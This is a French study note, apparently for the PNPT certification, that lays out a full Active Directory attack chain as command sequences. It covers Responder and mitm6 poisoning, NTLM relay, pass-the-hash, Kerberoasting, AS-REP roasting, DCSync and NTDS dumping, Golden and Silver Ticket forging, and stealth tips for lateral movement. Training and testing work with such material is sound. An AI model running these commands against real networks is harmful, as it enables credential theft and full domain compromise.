---
title: "Active Directory Attacks (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, active-directory, kerberos, pnpt]
date: "2026-05-18"
---

# Active Directory Attacks

L'AD est le système nerveux de 95% des entreprises. Le compromettre, c'est compromettre tout. Cette note est la séquence type d'une attaque AD interne : de "je viens de connecter mon Kali au réseau" à "Domain Admin". Voir aussi `[[Active Directory Security]]` pour les détails et `[[Kerberos Attacks]]` pour le protocole.

## Le chemin de l'attaque AD

```
   Branchement réseau interne (zéro credential)
            │
            ▼
   ┌─────────────────────┐
   │ Responder / mitm6   │  Capter LLMNR, NBT-NS, IPv6 → premier hash
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ Crack hash OU relay │  Hashcat NetNTLMv2, ou ntlmrelayx direct
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ User valide         │  Énumération AD (LDAP, BloodHound)
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ Kerberoasting,      │  Récupérer hashes de comptes de service
   │ AS-REP Roasting     │
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ Mouvement latéral   │  PsExec, WinRM, WMI avec creds/hashes
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ Privilege escalation│  ACL abuse, ADCS, BloodHound paths
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ DCSync / NTDS.dit   │  Tous les hashes du domaine
   └──────────┬──────────┘
              │
              ▼
   ┌─────────────────────┐
   │ Golden Ticket       │  Persistance ultime (krbtgt)
   └─────────────────────┘
```

## Concepts indispensables

```
DC (Domain Controller) : serveur qui héberge l'AD (LDAP + Kerberos + SAM réseau)
NTLM    : protocole d'auth historique (challenge-response, hash NT)
Kerberos: protocole d'auth par tickets (TGT, TGS)
SPN     : Service Principal Name — lie un service (ex. MSSQL/sql01) à un compte
krbtgt  : compte spécial dont le hash protège TOUS les TGT du domaine
SID     : Security Identifier — identifiant unique d'un compte/groupe
SACL/DACL: ACLs sur objets AD (qui peut lire/écrire quoi)
```

## Énumération AD

```bash
# Sans creds (anonyme, parfois possible)
enum4linux-ng IP
crackmapexec smb IP -u '' -p '' --shares
nxc smb IP -u '' -p ''

# Avec creds — LDAP
ldapsearch -x -H ldap://DC_IP -b "dc=cible,dc=com" -D "user@cible.com" -w 'pass'
windapsearch -d cible.com --dc-ip DC -u user -p pass -U   # users
windapsearch -d cible.com --dc-ip DC -u user -p pass -G   # groupes

# CrackMapExec / NetExec (avec creds)
nxc smb DC_IP -u user -p pass --users
nxc smb DC_IP -u user -p pass --groups
nxc smb DC_IP -u user -p pass --pass-pol      # politique mots de passe
nxc ldap DC_IP -u user -p pass --kerberoasting hashes.txt

# BloodHound — collecte
bloodhound-python -u user -p pass -d cible.com -ns DC_IP -c all
# Puis import dans BloodHound GUI → graphes d'attaque
```

**Pourquoi BloodHound est central** : il modélise l'AD comme un graphe. "Shortest path from owned principal to Domain Admins" répond automatiquement à la question "quel est le chemin d'attaque ?". Sans BloodHound, on fait ce travail à la main, mal.

## Attaques sans credentials initiaux

### LLMNR / NBT-NS Poisoning (Responder)

Si une machine demande "où est `\\serveurinexistant\share` ?", Windows broadcast la question via LLMNR puis NBT-NS. Responder répond "c'est moi !" et capte la tentative d'auth → NetNTLMv2 hash, crackable.

```
   Victime : "Qui est \\fileserver-typo\share ?"
       │   (LLMNR broadcast)
       ▼
   Attaquant (Responder) : "C'est moi !"
       │
       ▼
   Victime envoie auth NTLM → hash NetNTLMv2 capturé
```

```bash
sudo responder -I eth0 -dwPv

# Cracker le hash capturé
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### SMB Relay

Variante puissante : au lieu de capter et cracker, on relaie l'authentification vers une autre cible où on a des droits. Si la victime est admin sur cette autre machine → exécution directe.

```bash
# Identifier les cibles sans SMB signing (relay possible)
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt

# Préparer Responder : désactiver SMB et HTTP dans Responder.conf
sudo nano /etc/responder/Responder.conf

# Lancer ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Avec exécution de commande
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM directement
sudo ntlmrelayx.py -tf targets.txt -smb2support --dump
```

**Condition** : `SMB signing` non requis sur la cible relayée. Sur Windows 10/11 client, signing requis par défaut. Sur Servers, souvent non.

### mitm6 — IPv6 DNS Takeover

Windows préfère IPv6 à IPv4. Si on devient le serveur DHCPv6 du réseau, on devient leur DNS, on peut rediriger l'auth vers nos relais.

```bash
sudo mitm6 -d cible.com

# En parallèle, relai vers LDAPS du DC pour ajouter une ACL ou créer un user
sudo ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakepad.cible.com -l loot
```

## Attaques avec credentials

### Pass-the-Hash

NTLM accepte le hash directement. Donc avec le hash NT (sans connaître le mot de passe en clair), on peut s'authentifier partout où NTLM est accepté.

```bash
nxc smb IP -u user -H NTHASH
psexec.py cible.com/user@IP -hashes :NTHASH
evil-winrm -i IP -u user -H NTHASH
wmiexec.py cible.com/user@IP -hashes :NTHASH
```

### Kerberoasting

```
Principe :
  Tout utilisateur authentifié peut demander un TGS pour n'importe quel SPN.
  Le TGS est chiffré avec le hash du compte de service.
  → On extrait le hash, on le cracke hors ligne (pas de lockout).
  Cibles idéales : comptes de service avec mots de passe humains.
```

```bash
# Demander tous les TGS pour les comptes avec SPN
GetUserSPNs.py cible.com/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Cracker (mode 13100 = TGS-REP RC4-HMAC, 19700 = AES256)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

Comptes avec `DONT_REQUIRE_PREAUTH` → on peut demander un AS-REP pour eux sans connaître leur mot de passe. L'AS-REP contient une partie chiffrée → crackable.

```bash
# Sans creds : il faut une liste d'usernames valides
GetNPUsers.py cible.com/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat -outputfile asrep.txt

# Avec creds : on trouve les comptes vulnérables automatiquement
GetNPUsers.py cible.com/user:password -dc-ip DC_IP -request -outputfile asrep.txt

# Cracker
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Token Impersonation (post-meterpreter)

Si on a un Meterpreter avec assez de privilèges, on peut emprunter le token d'un autre utilisateur connecté localement.

```bash
load incognito
list_tokens -u
impersonate_token "CIBLE\\admin"
```

### DCSync

Demander au DC de "se répliquer" vers nous → on reçoit les hashes de tous les comptes du domaine. Nécessite les droits `Replicating Directory Changes` (Domain Admins, Enterprise Admins, ou ACL spécifique).

```bash
secretsdump.py cible.com/admin:password@DC_IP

# Avec Mimikatz (depuis Windows)
mimikatz # lsadump::dcsync /domain:cible.com /user:Administrator
```

### Golden Ticket

Avec le hash de krbtgt, on forge des TGT valides pour n'importe quel utilisateur (y compris Administrator), avec n'importe quels groupes. Persistance ultime — le mot de passe krbtgt doit être changé DEUX FOIS pour invalider les Golden Tickets.

```bash
# Avec Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain cible.com fakeadmin
export KRB5CCNAME=fakeadmin.ccache
psexec.py cible.com/fakeadmin@DC -k -no-pass

# Avec Mimikatz (sur Windows)
kerberos::golden /user:fakeadmin /domain:cible.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### Silver Ticket

Variante : avec le hash d'un compte de service (pas krbtgt), on forge un TGS valide pour ce service uniquement. Moins puissant qu'un Golden Ticket mais plus discret (ne touche pas le DC).

```bash
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... \
  -domain cible.com -spn CIFS/target.cible.com user
```

## Mouvement latéral

Une fois un compte valide, on saute de machine en machine.

```bash
psexec.py cible.com/user:password@IP             # shell SYSTEM via SMB (bruyant)
wmiexec.py cible.com/user:password@IP            # via WMI (plus discret)
smbexec.py cible.com/user:password@IP            # autre variante SMB
evil-winrm -i IP -u user -p password             # WinRM (recommandé si dispo)
xfreerdp /v:IP /u:user /p:password               # RDP graphique
```

## Post-exploitation domain-wide

Une fois Domain Admin (ou équivalent) :

```bash
# Dump tous les hashes du domaine
secretsdump.py cible.com/admin:password@DC_IP

# Via CrackMapExec
nxc smb DC_IP -u admin -p pass --ntds

# Cibler NTDS.dit directement
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

## Pièges courants

- **Responder en pleine journée** : sur un réseau actif, les requêtes LLMNR pleuvent → on capte vite. Mais on perturbe aussi les vraies résolutions et on se fait remarquer.
- **mitm6 casse IPv6 du réseau** : tous les Windows qui demandent IPv6 viennent vers toi. Sur un grand réseau, c'est un DoS. Limiter avec `--ignore-nofqdn` et un domaine cible précis.
- **Kerberoasting AES256 (mode 19700) est BEAUCOUP plus lent à cracker** que RC4 (13100). Si tu vois `$krb5tgs$23$` = RC4 (rapide), `$krb5tgs$18$` = AES256.
- **PsExec dépose un service temporaire** → loggé en event ID 7045. Préférer WMI ou WinRM quand possible.
- **Golden Ticket avec mauvais SID** : le SID du domaine doit être correct. `whoami /user` sur un compte du domaine donne le SID, garder les 21-X-Y-Z (le RID final change).
- **DCSync depuis un compte non-DA** : possible si ACL `Replicating Directory Changes` accordée. BloodHound le révèle. C'est une privesc en soi.
- **Le compte krbtgt a deux historiques** : changer le mot de passe une fois ne suffit pas, car les Golden Tickets utilisent l'ancien hash encore valide. Il faut le changer deux fois rapidement.
